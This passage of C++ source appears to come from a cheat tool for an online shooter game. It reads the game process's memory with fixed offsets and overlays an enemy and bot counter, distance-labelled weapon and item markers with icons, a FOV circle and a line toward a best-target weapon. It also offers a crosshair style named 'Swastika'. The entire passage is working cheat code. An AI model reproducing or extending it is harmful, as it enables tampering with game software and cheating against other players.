										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{
											///*std::string total = " ENEMYS ARROUND: ";
											//*/total.append(std::to_string((Data::AActorList.size())));

											std::string player = u8" ﺐﻋﻻ ";
											player.append(std::to_string(playercount));
											std::string bot = u8"ﺕﻮﺑ ";
											bot.append(std::to_string(botcount));

											//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
											//ImGui::Text(total.c_str());
											//ImGui::PopStyleColor();
											//ImGui::SameLine();

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 0, 255));

											ImGui::Text(player.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();

											ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
											ImGui::Text(bot.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
									else
									{

										g_Discord->Update();
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 108));

										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(204, 204, 204, 255));
										ImGuiIO& Io = ImGui::GetIO();

										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

										if (ImGui::Begin("ene", 0, Flags221))
										{

											std::string playerA = u8" ﻚﻟﻮﺣ ﻦﻴﺒﻋﻻ ﺪﺟﻮﻳ ﻻ ";

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(playerA.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();
										}
										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 108));

									ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(204, 204, 204, 255));
									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = u8" ﺲﻛﺎﻫ ﺪﻨﻴﺠﻴﻟ ﻲﻓ ﻚﺑ ﺎﺒﺣﺮﻣ ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();

								}
							}
							else if (TotalEnemyStyle == 1)
							{
								DrawTotalEnemies();
							}
							if (TotalEnemyStyle == 2)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(255, 0, 0, 80));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 0, 0, 255));
										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{

											std::string player = u8" ﻦﻴﺒﻋﻼﻟﺍ: ";
											player.append(std::to_string(playercount));
											std::string bot = u8"ﺕﺎﺗﻮﺒﻟﺍ: ";
											bot.append(std::to_string(botcount));


											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(player.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();

											ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
											ImGui::Text(bot.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
									else
									{

										g_Discord->Update();
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 255, 0, 100));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 255, 0, 255));
										ImGuiIO& Io = ImGui::GetIO();

										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

										if (ImGui::Begin("ene", 0, Flags221))
										{

											std::string playerA = u8" ﻚﻟﻮﺣ ﻦﻴﺒﻋﻻ ﺪﺟﻮﻳ ﻻ ";

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(playerA.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();
										}
										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(255, 0, 0, 100));
									ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(255, 0, 0, 255));
									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = u8" ﺲﻛﺎﻫ ﺪﻨﻴﺠﻴﻟ ﻲﻓ ﻚﺑ ﺎﺒﺣﺮﻣ ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();

								}
							}
							if (TotalEnemyStyle == 3)
							{
								if (Data::NetDriver > 0)
								{
									g_Discord->Update();

									if (Data::AActorList.size() != 0)
									{

										botcount = 0;
										playercount = 0;
										for (int i = 0; i < Data::AActorList.size(); i++)
										{
											if (Data::AActorList[i].Name == " Bot ")
											{
												botcount = botcount + 1;
											}
											else
											{
												playercount = playercount + 1;
											}
										}
										ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
										ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 255, 0, 255));
										ImGui::SetNextWindowSize(ImVec2(0, 0));
										ImGuiStyle& sstyle = ImGui::GetStyle();
										ImVec4* colors = sstyle.Colors;
										ImGuiIO& Io = ImGui::GetIO();
										ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));
										if (ImGui::Begin("ene", 0, Flags221))
										{
											std::string player = u8":ﻚﻟﻮﺣ ﻦﻴﺒﻋﻼﻟﺍ ﻉﻮﻤﺠﻣ ";
											player.append(to_string(Data::AActorList.size()) + " ");

											ImGui::PushStyleColor(ImGuiCol_Text, to_vec4(255, 255, 255, 255));

											ImGui::Text(player.c_str());
											ImGui::PopStyleColor();
											ImGui::SameLine();
											ImGui::End();

										}

										ImGui::PopStyleColor();
										ImGui::PopStyleColor();

									}
								}
								else
								{
									g_Discord->Update();

									ImGui::PushStyleColor(ImGuiCol_WindowBg, to_vec4(0, 0, 0, 130));
									ImGui::PushStyleColor(ImGuiCol_Border, to_vec4(0, 255, 0, 255));
									ImGuiIO& Io = ImGui::GetIO();

									ImGui::SetNextWindowPos(ImVec2(Io.DisplaySize.x * 0.5f, Io.DisplaySize.y * 0.1f), ImGuiCond_FirstUseEver, ImVec2(0.5f, 0.1f));

									if (ImGui::Begin("ene", 0, Flags221))
									{
										int minutes = Data::TimeRemind / 60;
										int hours = minutes / 60;
										std::string playerA = u8" ﺲﻛﺎﻫ ﺪﻨﻴﺠﻴﻟ ﻲﻓ ﻚﺑ ﺎﺒﺣﺮﻣ ";

										ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										ImGui::Text(playerA.c_str());
										ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 255, 255, 255));
										//ImGui::Text(botA.c_str());
										//ImGui::PopStyleColor();
										//ImGui::SameLine();

										//ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 214, 255, 255));
										//ImGui::Text(LobbyTime.c_str());
										//ImGui::PopStyleColor();
										ImGui::End();
									}
									ImGui::PopStyleColor();
									ImGui::PopStyleColor();

								}
							}
						}
					}
					if (Setting::c_enable)
					{

						if (Setting::crosshair == 0)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::Dot, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
						if (Setting::crosshair == 1)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::Plus, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
						if (Setting::crosshair == 2)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::Cross, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
						if (Setting::crosshair == 3)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::Gap, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
						if (Setting::crosshair == 4)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::Swastika, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
						if (Setting::crosshair == 5)
						{
							DX11::ImGui_DX11::DrawCrosshair(DX11::CrosshairStyle::HitMaker, DX11Window::Width / 2, DX11Window::Height / 2, Setting::size, Setting::stroke, ImColor(Setting::crosshaircolor[0], Setting::crosshaircolor[1], Setting::crosshaircolor[2], Setting::crosshaircolor[3]));
						}
					}
					if (Setting::gameinfo)
					{
						Drawgameinfo();
					}
					if (Setting::fovcircle && Data::AActorList.size() != 0)
					{
						DX11::ImGui_DX11::DrawCircle(DX11Window::Width / 2, DX11Window::Height / 2, Setting::fovcircleredus, ImColor(Setting::fovcirclecolor[0], Setting::fovcirclecolor[1], Setting::fovcirclecolor[2], Setting::fovcirclecolor[3]), 1);
					}
					if (Setting::Lang == 0 || Setting::Lang == 2)
					{
						if (!Setting::fightmode)
						{
							if (Setting::allitemss)
							{
								if (Setting::impitems || Setting::healthitem || Setting::scope || Setting::allitemss && !Setting::fightmode)
								{
									if (Data::ItemList.size() != 0)
									{
										TempItemList.clear();
										TempItemList = Data::ItemList;
										for (Item& Item : Data::ItemList)
										{
											if (!Algorithm::WorldToScreen(Data::lOCALPLAYERPosotion, Item.Position, Screen, &Distance, ViewMatrix)) continue;
											if (Distance > Setting::ItemDistance) continue;
											if (Setting::nearstAR && Item.Address == Memory::AimFindBestTargetWeapon())
											{
												DX11::ImGui_DX11::DrawLine(DX11Window::Width / 2, DX11Window::Height, Screen.X, Screen.Y, ImColor(Setting::nearstARColors[0], Setting::nearstARColors[1], Setting::nearstARColors[2], Setting::nearstARColors[3]), Setting::NearstArLineThikness);
											}
											std::string	Textt = Item.Name;
											Item.Position = Utility::ReadMemoryEx<VECTOR3>(Utility::ReadMemoryEx<DWORD>(Item.Address + Offset::RootComponent) + Offset::Position);
											Text = Item.Name + " [" + to_string(Distance) + "M]";
											if (Setting::allitemss)
											{
												if (Setting::UselessShow)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Normalfontsize, Textt, Screen.X - 70, Screen.Y + 30, ImColor(255, 255, 255, 255), true);

												}
												if (Setting::impitems)
												{
													std::string air = Item.Name + " [" + to_string(Distance) + "M]";
													if (Setting::Esp_Item_AKM && Item.Name == u8"AKM")
													{
														if (Setting::Esp_Item_AKM_Icon)
														{

															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::AK, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::AK, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//	else
															//	{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AKM_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AKM_Color[0], Setting::Esp_Item_AKM_Color[1], Setting::Esp_Item_AKM_Color[2], Setting::Esp_Item_AKM_Color[3]), true);
														continue;
														//	}
													}
													if (Setting::Esp_Item_SCARL && Item.Name == u8"SCAR-L")
													{
														if (Setting::Esp_Item_SCARL_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::SCARL, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::SCARL, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}

														//	else
													//	{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SCARL_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M416_Color[0], Setting::Esp_Item_M416_Color[1], Setting::Esp_Item_M416_Color[2], Setting::Esp_Item_M416_Color[3]), true);
														continue;
														//	}


													}
													if (Setting::Esp_Item_M416 && Item.Name == u8"M416")
													{
														if (Setting::Esp_Item_M416_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M416, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M416, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
															//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M416_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M416_Color[0], Setting::Esp_Item_M416_Color[1], Setting::Esp_Item_M416_Color[2], Setting::Esp_Item_M416_Color[3]), true);
														continue;
														//}


													//continue;
													}
													if (Setting::Esp_Item_M24 && Item.Name == u8"M24")
													{
														if (Setting::Esp_Item_M24_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M24, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M24, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}

														//else
															//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M24_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M24_Color[0], Setting::Esp_Item_M24_Color[1], Setting::Esp_Item_M24_Color[2], Setting::Esp_Item_M24_Color[3]), true);
														continue;
														//	}
													}
													if (Setting::Esp_Item_Kar98k && Item.Name == u8"Kar98k")
													{
														if (Setting::Esp_Item_M24_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Kar98, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Kar98k_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Kar98k_Color[0], Setting::Esp_Item_Kar98k_Color[1], Setting::Esp_Item_Kar98k_Color[2], Setting::Esp_Item_Kar98k_Color[3]), true);
														continue;
														//}
													}
													if (Item.Name == u8"Win Statue")
													{
														string  statue1 = Item.Name + " [" + to_string(Distance) + "M]";
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, statue1, Screen.X - 60, Screen.Y + 30, ImColor(255, 255, 255, 255), true);
														continue;
													}
													if (Setting::Esp_Item_DP28 && Item.Name == u8"DP28")
													{
														if (Setting::Esp_Item_DP28_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::DP28, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::DP28, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DP28_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DP28_Color[0], Setting::Esp_Item_DP28_Color[1], Setting::Esp_Item_DP28_Color[2], Setting::Esp_Item_DP28_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_M762 && Item.Name == u8"M762")
													{
														if (Setting::Esp_Item_M762_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M762, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M762, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M762_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M762_Color[0], Setting::Esp_Item_M762_Color[1], Setting::Esp_Item_M762_Color[2], Setting::Esp_Item_M762_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_SawedOff && Item.Name == u8"SawedOff")
													{
														if (Setting::Esp_Item_SawedOff_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::SawedOff, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::SawedOff, Screen.X - 50, Screen.Y - 25, 40, 40);
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SawedOff_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SawedOff_Color[0], Setting::Esp_Item_SawedOff_Color[1], Setting::Esp_Item_SawedOff_Color[2], Setting::Esp_Item_SawedOff_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_S12K && Item.Name == u8"S12K")
													{
														if (Setting::Esp_Item_S12K_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S12K, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S12K, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S12K_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S12K_Color[0], Setting::Esp_Item_S12K_Color[1], Setting::Esp_Item_S12K_Color[2], Setting::Esp_Item_S12K_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_S1897 && Item.Name == u8"S1897")
													{
														if (Setting::Esp_Item_S1897_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S1897, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S1897, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}

														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S1897_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S1897_Color[0], Setting::Esp_Item_S1897_Color[1], Setting::Esp_Item_S1897_Color[2], Setting::Esp_Item_S1897_Color[3]), true);
														continue;

													}

													if (Setting::Esp_Item_S686 && Item.Name == u8"S686")
													{
														if (Setting::Esp_Item_S686_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S686, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S686, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S686_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S686_Color[0], Setting::Esp_Item_S686_Color[1], Setting::Esp_Item_S686_Color[2], Setting::Esp_Item_S686_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_DBS && Item.Name == u8"DBS")
													{
														if (Setting::Esp_Item_DBS_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::DBS, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::DBS, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DBS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DBS_Color[0], Setting::Esp_Item_DBS_Color[1], Setting::Esp_Item_DBS_Color[2], Setting::Esp_Item_DBS_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_M1014 && Item.Name == u8"M1014")
													{
														if (Setting::Esp_Item_M1014_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M1014, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M1014, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M1014_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M1014_Color[0], Setting::Esp_Item_M1014_Color[1], Setting::Esp_Item_M1014_Color[2], Setting::Esp_Item_M1014_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_M1014 && Item.Name == u8"Neostead")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M1014_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M1014_Color[0], Setting::Esp_Item_M1014_Color[1], Setting::Esp_Item_M1014_Color[2], Setting::Esp_Item_M1014_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_Awm && Item.Name == u8"AWM")
													{
														if (Setting::Esp_Item_Awm_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::AWM, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::AWM, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Awm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Awm_Color[0], Setting::Esp_Item_Awm_Color[1], Setting::Esp_Item_Awm_Color[2], Setting::Esp_Item_Awm_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Groza && Item.Name == u8"Groza")
													{
														if (Setting::Esp_Item_Groza_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Groza, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Groza, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Groza_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Groza_Color[0], Setting::Esp_Item_Groza_Color[1], Setting::Esp_Item_Groza_Color[2], Setting::Esp_Item_Groza_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_FlareGun && Item.Name == u8"Flare Gun")
													{
														if (Setting::Esp_Item_Flare_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
